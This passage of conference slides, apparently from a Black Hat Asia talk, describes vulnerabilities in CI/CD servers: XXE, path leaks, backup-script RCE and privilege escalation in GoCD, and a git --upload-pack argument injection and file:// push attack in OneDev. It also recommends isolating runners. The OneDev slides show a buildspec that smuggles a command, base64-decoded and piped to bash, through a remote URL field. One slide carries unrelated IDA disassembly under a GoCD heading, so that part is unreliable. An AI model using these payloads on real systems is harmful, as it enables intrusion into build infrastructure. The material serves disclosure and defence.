»
rid Cases
smoke
Instance: 6205,
Triggered by changes
on 18 Mar, 2025 at 00:43:50 Local Time
PublishStableRelease
Instance: 105
Triggered by chadiwilson
on 27 Jan, 2025 at 01:04:57 Local Time
regression-SPAs
Instance: 3817
Triggered by chadiwilson
‘on 18 Mar, 2025 at 03:00:02 Local Time
gocd-trial-installers
Instance: 3596
Triggered by changes
‘on 18 Mar, 2025 at 09:00:33 Local Time
```

## Slide 86

### GoCD

#### Create Configuration Repository

Load Configuration from a repository (similar to Bamboo Specs)

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
GoCD
Create Configuration Repository
Create new configuration repository x
Config repository name* Plugin ID
poc JSON Configuration Plugin v
Material type’
Git v
URL Branch
https://gitlab.com/demo621918/myscript main]
Username Password
Repository polling behavior
@ Regularly fetch updates to this repository
Fetch updates to this repository only on webhook or manual trigger
Cancel Save
Load Configuration from a repository (similar to Bamboo Specs)
```

## Slide 87

### GoCD Create Configuration Repository

GoCD stores server configuration in a xml file

#BHAS @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 84/100 on the text kept, 73/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
qurtkernel.o

[Left IDA window]
.start:0000047C 00 40 00 00              { immext (#0)
.start:00000480
.start:00000480              loc_480:                    @ DATA XREF: sub[obscured by overlapping window]
.start:00000480 00 40 99 91                  r0 = memw (r25 + ##start)
.start:00000484 00 40 00 00                  immext (#0)
.start:00000488 01 C0 99 91                  r1 = memw (r25 + ##start) }
.start:0000048C 3C C0 00 67              { s60 = r0 }
.start:00000490 3F C0 01 67              { chicken = r1 }        @ S63
.start:00000494
.start:00000494              _configure_basic_syscfg:
.start:00000494 00 C0 92 6E              { r0 = syscfg }
.start:00000498 02 40 00 7C              { r3:2 = combine (#start, #start)
.start:0000049C 40 C8 80 76                  r0 = or (r0, #byte_42) }
.start:000004A0 12 C0 00 67              { syscfg = r0 }
.start:000004A4 1E C0 02 6D              { s31:30 = r3:2 }
.start:000004A8 02 C0 C0 57              { isync }
.start:000004AC 00 40 00 00              { immext (#0)
.start:000004B0 00 40 99 91                  r0 = memw (r25 + ##start)
.start:000004B4 00 40 00 00                  immext (#0)
.start:000004B8 01 C0 99 91                  r1 = memw (r25 + ##start) }
.start:000004BC 06 40 00 10              { p0 = cmp.eq (r0, #start) ; if (p0.new) jump:nt _setup_isdb
.start:000004C0 06 C0 41 12                  p1 = cmp.eq (r1, #start) ; if (!p1.new) jump:nt _setup_isdb }
.start:000004C4
.start:000004C4              _stop_at_bootup:            @ CODE XREF: start_next:_stop_at_bootup(down)j
.start:000004C4 00 C0 00 58              { jump _stop_at_bootup }
.start:000004C4              @ End of function start_next
.start:000004C4
.start:000004C8
.start:000004C8              @ =============== S U B R O U T I N E =======================================
.start:000004C8
.start:000004C8
.start:000004C8              _setup_isdb:                @ CODE XREF: start_next+BC(up)j
.start:000004C8                                          @ start_next+C0(up)j ...
.start:000004C8 A0 41 00 78              { r0 = #(loc_C+1)
.start:000004CC 00 C0 00 5A                  call _setup_isdb }
.start:000004D0 00 40 00 00              { immext (#0)
.start:000004D4 0A 40 99 91                  r10 = memw (r25 + ##start)
.start:000004D8 0C C0 02 24                  if (cmp.eq (r10.new, #start)) jump:nt _setup_isdb_start }
.start:000004D8              @ End of function _setup_isdb
.start:000004D8

[Right IDA window]
.start:000004F8              loc_4F8:                    @ DATA XREF: QURTK_init_cache_params:loc_3490(down)o
.start:000004F8 02 E1 00 92              { r2 = memw_phys (r0, r1) }
.start:000004FC 42 50 02 8C              { r2 = asl (r2, #loc_10)
.start:00000500
.start:00000500              loc_500:                    @ DATA XREF: sub_36B8+28(down)o
.start:00000500                                          @ QURTK_ack_int+30(down)o
.start:00000500 00 40 00 00                  immext (#0)
.start:00000504 00 D2 B9 A1                  memw (r25 + ##start) = r2.new }
.start:00000508 0A C0 AA 6E              { r10 = isdben }
.start:0000050C 00 42 0A 85              { p0 = tstbit (r10, #(start+2))
.start:00000510 1E D8 20 5C                  if !p0.new jump:t _setup_isdb_cont }
.start:00000514 00 40 00 00              { immext (#0)
.start:00000518 0A 40 99 91                  r10 = memw (r25 + ##start)
.start:0000051C 1A E0 02 24                  if (cmp.eq (r10.new, #start)) jump:t _setup_isdb_cont }
.start:00000520 09 51 34 05              { immext (#0x53444240)
.start:00000524 EB 40 00 78                  r11 = ##0x53444247
.start:00000528 0A C0 8A 91                  r10 = memw (r10 + #start) }
.start:0000052C 00 4B 0A F2              { p0 = cmp.eq (r10, r11)
.start:00000530 0E 58 20 5C                  if !p0.new jump:t _setup_isdb_cont @ not equal
.start:00000534 00 40 00 00                  immext (#0)
.start:00000538 0A C0 19 B0                  r10 = add (r25, ##start) }
.start:0000053C 01 40 4A 3C              { memw (r10 + #start) = #(start+1)
.start:00000540 81 C0 4A 3C                  memw (r10 + #loc_4) = #(start+1) }
.start:00000544 01 C1 4A 3C              { memw (r10 + #loc_8) = #(start+1) }
.start:00000548
.start:00000548              _setup_isdb_cont:           @ CODE XREF: setup_isdb_cont+4(up)j
.start:00000548                                          @ setup_isdb_cont+30(up)j ...
.start:00000548 21 40 00 78              { r1 = #(start+1)
.start:0000054C 00 40 00 00                  immext (#0)
.start:00000550 11 40 99 91                  r17 = memw (r25 + ##start)
.start:00000554 0C E0 03 24                  if (cmp.eq (r17.new, #start)) jump:t _skip_isdb_debug }
.start:00000558 2A C0 01 67              { isdben = r1 }             @ enable
.start:0000055C 02 C0 C0 57              { isync }
.start:00000560 [cut off at bottom of window]
```

## Slide 88

### GoCD

#### Finding-1: XXE

\```
publicPartialConfigProvider
partialConfigProviderFor(StringpluginId) {
\```

\```
if(pluginId == null|| pluginId.equals("gocd-xml"))
returnembeddedXmlPlugin;
returnnewConfigRepoPlugin(configConverter,
crExtension, pluginId);
}
\```

- By default, Configuration Repository parses JSON or YAML as input

- • However, it also parses XML, and the XML parsing library is vulnerable to XXE

\```
<config-repoid="test-xxe-repo"
pluginId="yaml.config.plugin">gocd-xml
<giturl="https://gitlab.com/attacker/xml-repo"
branch="main"/>
</config-repo>
\```

- Edit the pluginId to gocd-xml so you can trigger the XXE

- Even the dev do not know about the existence of this plugin

#BHAS @BlackHatEvents

## Slide 89

### GoCD Finding-2: Leak the Path again

- No chances of using symbolic link to read file contents by YAML/JSON

- Still capable of leaking the repository path via malformed JSON

#BHAS @BlackHatEvents

## Slide 90

### GoCD Finding-2: Leak the Path again

- GoCD stores all repositories used in pipelines as bare repositories in the flyweight directory and assigns them UUID directory names

- However, if an error occurs during the repository checkout process, the files in the repository will be retained

- • No file isolation!

#BHAS @BlackHatEvents

## Slide 91

### GoCD Finding-3: Backup Scripts RCE

- Not that hard to find a backup script settings that can execute scripts on the server

- If we specify the Post backup script as a pre-prepared malicious script in the repository, we will gain the ability to execute arbitrary commands

- • RCE again

#BHAS @BlackHatEvents

## Slide 92

### GoCD Finding-3: Backup Scripts RCE

- Pretty impractical if these vulnerabilities require admin privileges

- • But we can still find a Priv-esc to make them valuable!

#BHAS @BlackHatEvents

## Slide 93

### GoCD

#### Finding-4: Regular User to System Admin

\```
.addAuthorityFilterChain("/admin/**",
genericAccessDeniedHandler, ROLE_SUPERVISOR)
\```

- GoCD uses jruby so it can handle some logics through rails app

- • By default, you can’t access admin routes as a regular user

\```
AuthorizeFilterChain.java
\```

\```
get "admin/config_xml"=> "admin/configuration#show",
as::config_view
\```

\```
put "admin/config_xml"=> "admin/configuration#update",
as::config_update
\```

- However, it is possible to directly access these handlers by rails routes without permission check

\```
get "admin/config_xml/edit"=>
"admin/configuration#edit", as::config_edit
\```

\```
configuration_controller.rb
\```

- Update the config xml and you’re admin now!

\```
<servlet-mapping>
\```

\```
<servlet-name>rails</servlet-name>
\```

\```
<url-pattern>/rails/*</url-pattern>
\```

\```
</servlet-mapping>
\```

\```
web.xml
\```

#BHAS @BlackHatEvents

## Slide 94

### Real World Cases OneDev

- Git server with CI/CD, kanban, and packages

- • Steps are defined in job to execute scripts on designated images

- • Let’s take a look at the CI/CD steps

#BHAS @BlackHatEvents

## Slide 95

### Real World Cases OneDev

- System commands can only be successfully executed within the container by default

- Effectively isolates the server environment from the worker environment

- Have the other steps also correctly implemented isolation?

#BHAS @BlackHatEvents

## Slide 96

### OneDev Finding-1: Pull from Remote

- Pull from Remote Step require Remote URL and refs as input

- `git fetch [remoteUrl] [refs:refs` `]`

- • Validation on Remote URL, but it can be bypassed by editing `.onedev` `-` `buildspec.yml`

#BHAS @BlackHatEvents

## Slide 97

### OneDev

#### Finding-1: Parameter Injection

--upload-pack

\```
version: 38
jobs:
-name: demo job
steps:
-!PullRepository
name: testjob
remoteUrl: |
--upload-pack=touch$IFS/tmp//pwned
echo dG91Y2ggL3RtcC9hYWEK |base64 -
d|bash-i
refs: aaa/bbb
withLfs: true
force: false
condition: ALWAYS
retryCondition: never
maxRetries: 3
retryDelay: 30
timeout: 3600
\```

Onedev performs a check for //

#BHAS @BlackHatEvents

## Slide 98

### OneDev Finding-2: Server Push Attack

- OneDev clones the repository into **local file system** and mounts into **container** instead of cloning directly inside container in order not to require user supplied image

- Lack of isolation between repository content during checkout/push and the server file system

- Lack of restrictions on allowed git protocols and <u>randomization for repository paths</u> /opt/onedev/temp/server/onedev-build-

- file:// {REPO_NUM}-{JOB_NUM}/workspace/

#BHAS @BlackHatEvents

## Slide 99

### OneDev

\```
version: 38
jobs:
\```

- `name: demo job steps:`

\```
-!CheckoutStep
name: mycheckout
cloneCredential: !DefaultCredential{}
withLfs: false
withSubmodules: false
condition: ALL_PREVIOUS_STEPS_WERE_SUCCESSFUL
\```

\```
-!CommandStep
name: mysleep
runInContainer: true
image: ubuntu:latest
interpreter: !DefaultInterpreter
commands: |
sleep 30
useTTY: true
condition: ALL_PREVIOUS_STEPS_WERE_SUCCESSFUL
retryCondition: never
\```

\```
version: 38
jobs:
-name: demo push
steps:
\```

\```
-!PushRepository
name: demo-push
remoteUrl:
file:///opt/onedev/temp/server/onedev-
build-3-1/workspace/evilgitdirectory/
force: false
condition: ALWAYS
retryCondition: never
\```

- Create a Job to checkout and sleep for 30s so that the repo won’t be deleted

- • Create another job to push to this repo

#BHAS @BlackHatEvents

## Slide 100

### OneDev Finding-2: Server Push Attack

##### RCE via Server Push Attack!

#BHAS @BlackHatEvents


> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
OneDev
Finding-2: Server Push Attack
demo push (#8) Successful @ .
Pipeline Artifacts Fixed Issues Changes
No job executor defined, auto-discovering...
Discovered job executor type: Server Docker Executor
Pending resource allocation...
root@eb9
Executing job (executor: auto-discovered, server: 127.0.0.1:5710, network: auto-discovered-1-8-0)...
20:39:4@ Copying job dependencies... pwned
@:39:4@ Running step "demo-push"...
20:39:42 Job finished
RCE via Server Push Attack!
```

## Slide 101

### Gitlab

#### Data Leak when using shared runners

- GitLab Runner implements different executors that can be used to run your builds in different environments(Shell, Docker, Kubernetes, etc.)

- Unfortunately, when you use Shell as the executor, GitLab does not provide effective data isolation to protect your project

- Projects from different users will remain on the same runner, and attacker simply using the ls and cat commands can access other users' projects, even if the projects themselves are private

#BHAS @BlackHatEvents

## Slide 102

### Never Shell Always Docker

- GitLab, Bamboo, GoCD, and OneDev all offer similar solutions for runner deployment, including Shell and Docker options

- • However, none of them provide sufficient data isolation in the Shell-based solution to ensure that different users do not expose their data when using the same runner

- We recommend that users choose the Docker-based solution when setting up runners to ensure data security

#BHAS @BlackHatEvents

## Slide 103

### Lessons

- The server can be just as vulnerable as the worker

- Always isolate code from critical infrastructure

- Always isolate user information from other users

- Always process code on the worker side when executing the pipeline

#BHAS @BlackHatEvents

## Slide 104

# Outline

#### 4. Takeways

#BHAS @BlackHatEvents

## Slide 105

### Takeways

- There may still be overlooked attack surface in the functional implementation details of CI/CD servers

- The absence of isolation mechanisms can lead to serious consequences

- Cloud-based SaaS has a natural advantage in implementing isolation mechanisms, offering significant benefits over on-premise products

#BHAS @BlackHatEvents

## Slide 106

## Thanks

#BHAS @BlackHatEvents
